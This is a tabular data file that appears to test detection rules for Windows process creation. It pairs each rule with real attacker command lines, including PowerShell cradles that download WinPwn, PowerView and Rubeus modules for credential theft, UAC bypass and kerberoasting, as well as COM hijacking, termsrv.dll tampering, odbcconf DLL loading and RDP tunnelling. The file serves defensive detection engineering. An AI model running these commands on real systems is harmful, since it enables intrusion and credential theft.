Technical	Rule_name	Title	Rule_id	Command_match_rule	Commandline_evasion	Excutable	Bypass target rule	Bypass all rule	Trigger rule
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest\"""" /ve /T REG_SZ /d \""""AtomicTest\"""" /f reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00\"""" /ve /T REG_SZ /d \""""AtomicTest\"""" /f reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest\CLSID\"""" /ve /T REG_SZ /d \""""{00000001-0000-0000-0000-0000FEEDACDC}\"""" /f reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00\CLSID\"""" /ve /T REG_SZ /d \""""{00000001-0000-0000-0000-0000FEEDACDC}\"""" /f reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\"""" /f reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\"""" /ve /T REG_SZ /d \""""AtomicTest\"""" /f reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32\"""" /ve /T REG_SZ /d \""""C:\WINDOWS\system32\scrobj.dll\"""" /f reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32\"""" /v \""""ThreadingModel\"""" /T REG_SZ /d \""""Apartment\"""" /f reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ProgID\"""" /ve /T REG_SZ /d \""""AtomicTest\"""" /f reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL\"""" /ve /T REG_SZ /d \""""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/src/TreatAs.sct\"""" /f reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\VersionIndependentProgID\"""" /ve /T REG_SZ /d \""""AtomicTest\"""" /f reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\"""" /f reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs\"""" /ve /T REG_SZ /d \""""{00000001-0000-0000-0000-0000FEEDACDC}\"""" /f rundll32.exe -sta \""""AtomicTest\""""}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {$RunOnceKey = \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce\"""" set-itemproperty $RunOnceKey \""""NextRun\"""" 'powershell.exe \""""IEX (New-Object Net.WebClient).DownloadString(`\""""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\"""")\""""'}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') UACBypass -noninteractive -command \""""C:\windows\system32\calc.exe\"""" -technique ccmstp}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') UACBypass -noninteractive -command \""""C:\windows\system32\cmd.exe\"""" -technique DiskCleanup}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') UACBypass -noninteractive -command \""""C:\windows\system32\cmd.exe\"""" -technique magic}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') passhunt -local $true -noninteractive}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') powershellsensitive -consoleoutput -noninteractive}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') sensitivefiles -noninteractive -consoleoutput}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') sessionGopher -noninteractive -consoleoutput}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') SharpCloud -consoleoutput -noninteractive}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') Snaffler -noninteractive -consoleoutput}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') decryptteamviewer -consoleoutput -noninteractive}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') lazagnemodule -consoleoutput -noninteractive}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') wificreds -consoleoutput -noninteractive}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1') Invoke-Rubeus -Command \""""kerberoast /format:hashcat /nowrap\""""}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') Kerberoasting -consoleoutput -noninteractive}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -exec bypass -c ""IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO"""	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') GPOAudit -noninteractive -consoleoutput}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') GPORemoteAccessPolicy -consoleoutput -noninteractive}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {powershell -nop -exec bypass -c \""""IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO\""""}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_invocation_specific	Suspicious PowerShell Invocations - Specific - ProcessCreation	536e2947-3729-478c-9903-745aaffe60d2		"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') mimiload -consoleoutput -noninteractive}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_set_acl	PowerShell Script Change Permission Via Set-Acl	bdeb2cff-af74-4094-8426-724dc937f20a		"""powershell.exe"" & {$termsrvDll = \""""C:\Windows\System32\termsrv.dll\"""" $ACL = Get-Acl $termsrvDll $permission = \""""Administrators\"""",\""""FullControl\"""",\""""Allow\"""" $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission $ACL.SetAccessRule($accessRule) Set-Acl -Path $termsrvDll -AclObject $ACL Copy-Item -Path \""""C:\Windows\System32\termsrv.dll\"""" -Destination \""""C:\Windows\System32\termsrv_backup.dll\"""" -ErrorAction Ignore Add-Content -Path \""""C:\Windows\System32\termsrv.dll\"""" -Value \""""`n\"""" -NoNewline -ErrorAction Ignore Move-Item -Path \""""C:\Windows\System32\termsrv_backup.dll\"""" -Destination \""""C:\Windows\System32\termsrv.dll\"""" -Force -ErrorAction Ignore}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_powershell_set_acl	PowerShell Script Change Permission Via Set-Acl	bdeb2cff-af74-4094-8426-724dc937f20a		"""powershell.exe"" & {$termsrvDll = \""""C:\Windows\System32\termsrv.dll\"""" $ACL = Get-Acl $termsrvDll $permission = \""""Administrators\"""",\""""FullControl\"""",\""""Allow\"""" $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission $ACL.SetAccessRule($accessRule) Set-Acl -Path $termsrvDll -AclObject $ACL Copy-Item -Path $termsrvDll -Destination \""""$HOME\AtomicTest.dll\"""" $newServiceDll = \""""$HOME\AtomicTest.dll\"""" $registryPath = \""""HKLM:\System\CurrentControlSet\services\TermService\Parameters\"""" # Check if the registry key exists if (Test-Path -Path $registryPath) {     # Modify the ServiceDll value in the registry     Set-ItemProperty -Path $registryPath -Name \""""ServiceDll\"""" -Value $newServiceDll     Write-Host \""""ServiceDll value in the registry has been updated to: $newServiceDll\"""" } else {     Write-Host \""""Registry key not found. Make sure the 'TermService\Parameters' key exists.\"""" }}"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_rundll32_mshtml_runhtmlapplication	Mshtml.DLL RunHTMLApplication Suspicious Usage	4782eb5a-a513-4523-a0ac-f3082b26ac5c		"""cmd.exe"" /c rundll32 vbscript:""\..\mshtml,#135 ""+String(CreateObject(""WScript.Shell"").Run(""calc.exe""),0)"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_rundll32_mshtml_runhtmlapplication	Mshtml.DLL RunHTMLApplication Suspicious Usage	4782eb5a-a513-4523-a0ac-f3082b26ac5c		"""cmd.exe"" /c rundll32 vbscript:""\..\mshtml,RunHTMLApplication ""+String(CreateObject(""WScript.Shell"").Run(""calc.exe""),0)"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_rundll32_mshtml_runhtmlapplication	Mshtml.DLL RunHTMLApplication Suspicious Usage	4782eb5a-a513-4523-a0ac-f3082b26ac5c		"""cmd.exe"" /c rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct"").Exec();window.close();"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_rundll32_mshtml_runhtmlapplication	Mshtml.DLL RunHTMLApplication Suspicious Usage	4782eb5a-a513-4523-a0ac-f3082b26ac5c		"rundll32  vbscript:""\..\mshtml,#135 ""+String(CreateObject(""WScript.Shell"").Run(""calc.exe""),0)"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_rundll32_mshtml_runhtmlapplication	Mshtml.DLL RunHTMLApplication Suspicious Usage	4782eb5a-a513-4523-a0ac-f3082b26ac5c		"rundll32  vbscript:""\..\mshtml,RunHTMLApplication ""+String(CreateObject(""WScript.Shell"").Run(""calc.exe""),0)"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_rundll32_mshtml_runhtmlapplication	Mshtml.DLL RunHTMLApplication Suspicious Usage	4782eb5a-a513-4523-a0ac-f3082b26ac5c		"rundll32.exe  javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct"").Exec();window.close();"	FALSE	FALSE	FALSE	
defense-evasion	proc_creation_win_susp_weak_or_abused_passwords	Weak or Abused Passwords In CLI	91edcfb1-2529-4ac2-9ecc-7617f895c7e4		"""powershell.exe"" & {if (-not (Test-Path \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1070-2.txt\"""")) { New-Item \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1070-2.txt\"""" -Force }  echo \""""1234567890\"""" > \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1070-2.txt\"""" fsutil  file setZeroData offset=0 length=10 \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1070-2.txt\""""}"	FALSE	FALSE	FALSE	
t1218.008	proc_creation_win_odbcconf_register_dll_regsvr	New DLL Registered Via Odbcconf.EXE	9f0a8bf3-a65b-440a-8c1e-5cb1547c8e70		"odbcconf.exe  /S /A {REGSVR ""C:\AtomicRedTeam\atomics\T1218.008\src\Win32\T1218-2.dll""}"	FALSE	FALSE	FALSE	
t1218.008	proc_creation_win_odbcconf_register_dll_regsvr	New DLL Registered Via Odbcconf.EXE	9f0a8bf3-a65b-440a-8c1e-5cb1547c8e70		odbcconf.exe /a {REGSVR C:\Temp\malicious.txt}	FALSE	FALSE	FALSE	
t1218.008	proc_creation_win_odbcconf_register_dll_regsvr_susp	Potentially Suspicious DLL Registered Via Odbcconf.EXE	ba4cfc11-d0fa-4d94-bf20-7c332c412e76		"odbcconf.exe /a {REGSVR ""fake.dll.dir\payload.bin""}"	FALSE	FALSE	FALSE	
t1218.008	proc_creation_win_odbcconf_register_dll_regsvr_susp	Potentially Suspicious DLL Registered Via Odbcconf.EXE	ba4cfc11-d0fa-4d94-bf20-7c332c412e76		"odbcconf.exe /a {REGSVR ""malicious.dll""}"	FALSE	FALSE	FALSE	
t1218.008	proc_creation_win_odbcconf_response_file	Response File Execution Via Odbcconf.EXE	5f03babb-12db-4eec-8c82-7b4cb5580868		"odbcconf.exe  -f ""T1218.008.rsp"""	FALSE	FALSE	FALSE	
t1218.008	proc_creation_win_odbcconf_response_file	Response File Execution Via Odbcconf.EXE	5f03babb-12db-4eec-8c82-7b4cb5580868		odbcconf.exe /a {REGSVR malicious.dll}	FALSE	FALSE	FALSE	
t1218.008	proc_creation_win_odbcconf_response_file	Response File Execution Via Odbcconf.EXE	5f03babb-12db-4eec-8c82-7b4cb5580868		odbcconf.exe /f C:\Windows\Temp\payload.txt	FALSE	FALSE	FALSE	
t1218.008	proc_creation_win_odbcconf_response_file	Response File Execution Via Odbcconf.EXE	5f03babb-12db-4eec-8c82-7b4cb5580868		odbcconf.exe /fC:\Windows\Temp\payload.rsp	FALSE	FALSE	FALSE	
t1566	proc_creation_win_office_onenote_susp_child_processes	Suspicious Microsoft OneNote Child Process	c27515df-97a9-4162-8a60-dc0eeb51b775		"copy powershell.exe trusted_updater.exe && ""ONENOTE.EXE"" /hyperlink trusted_updater.exe"	FALSE	FALSE	FALSE	
t1566	proc_creation_win_office_onenote_susp_child_processes	Suspicious Microsoft OneNote Child Process	c27515df-97a9-4162-8a60-dc0eeb51b775		"explorer.exe ""C:\Users\Public\Documents\payload.lnk"""	FALSE	FALSE	FALSE	
t1566	proc_creation_win_office_onenote_susp_child_processes	Suspicious Microsoft OneNote Child Process	c27515df-97a9-4162-8a60-dc0eeb51b775		"""ONENOTE.EXE"" /hyperlink ""calc.exe"""	FALSE	FALSE	FALSE	
t1566	proc_creation_win_office_onenote_susp_child_processes	Suspicious Microsoft OneNote Child Process	c27515df-97a9-4162-8a60-dc0eeb51b775		"""ONENOTE.EXE"" /hyperlink ""explorer.exe"" ""payload.exe"""	FALSE	FALSE	FALSE	
t1566	proc_creation_win_office_onenote_susp_child_processes	Suspicious Microsoft OneNote Child Process	c27515df-97a9-4162-8a60-dc0eeb51b775		"copy powershell.exe not_a_backdoor.exe && ""ONENOTE.EXE"" /hyperlink not_a_backdoor.exe"	FALSE	FALSE	FALSE	
t1572	proc_creation_win_plink_susp_tunneling	Potential RDP Tunneling Via Plink	f38ce0b9-5e97-4b47-a211-7dc8d8b871da		copy plink.exe C:\Windows\Temp ot_plink.exe && C:\Windows\Temp ot_plink.exe -R 3389:localhost:3389 -P 443 tunnel.com	FALSE	FALSE	FALSE	
t1572	proc_creation_win_plink_susp_tunneling	Potential RDP Tunneling Via Plink	f38ce0b9-5e97-4b47-a211-7dc8d8b871da		plink.exe -L 0.0.0.0:4444:127.0.0.1:3389 -P 8080 rdp-tunnel-vps.com	FALSE	FALSE	FALSE	
t1572	proc_creation_win_plink_susp_tunneling	Potential RDP Tunneling Via Plink	f38ce0b9-5e97-4b47-a211-7dc8d8b871da		plink.exe -L 3390:127.0.0.2:3389 -P 443 remoteserver.com	FALSE	FALSE	FALSE	
t1572	proc_creation_win_pua_3proxy_execution	PUA - 3Proxy Execution	f38a82d2-fba3-4781-b549-525efbec8506		copy 3proxy.exe svchost_proxy.exe && svchost_proxy.exe --interface 127.0.0.1 --port 8080	FALSE	FALSE	FALSE	
t1572	proc_creation_win_pua_ngrok	PUA - Ngrok Execution	ee37eb7c-a4e7-4cd5-8fa4-efa27f1c3f31		"""powershell.exe"" & {C:\Users\Public\ngrok\ngrok.exe config add-authtoken N/A | Out-Null Start-Job -ScriptBlock { C:\Users\Public\ngrok\ngrok.exe tcp 3389 } | Out-Null Start-Sleep -s 5  Stop-Job -Name Job1 | Out-Null}"	FALSE	FALSE	FALSE	
t1572	proc_creation_win_pua_ngrok	PUA - Ngrok Execution	ee37eb7c-a4e7-4cd5-8fa4-efa27f1c3f31		ngrok.exe start --config ./config.yml	FALSE	FALSE	FALSE	
